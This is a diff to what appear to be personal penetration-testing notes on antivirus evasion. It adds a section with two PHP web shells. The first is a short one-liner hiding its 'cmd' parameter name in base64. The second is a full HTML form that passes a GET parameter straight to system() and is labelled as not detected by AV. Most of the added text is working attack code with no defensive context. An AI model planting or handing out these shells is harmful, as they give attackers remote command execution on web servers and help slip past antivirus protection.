@@ -52,3 +52,36 @@ We again recommend using a development virtual machine to test and edit code.
 
 When creating a token command, you will need to be careful not to obfuscate the payload too much and exceed the 8191 character limit in a Windows command prompt.
 
+
+## So instead of all this will try this shell
+
+![[Pasted image 20240825202530.png]]
+
+Normal Payload
+```
+php system($_GET[base64_decode('Y21k')]);?>
+```
+It gets deleted as soon as we try to execute it. 
+
+
+Payload that is not detected by AV
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```
+
+
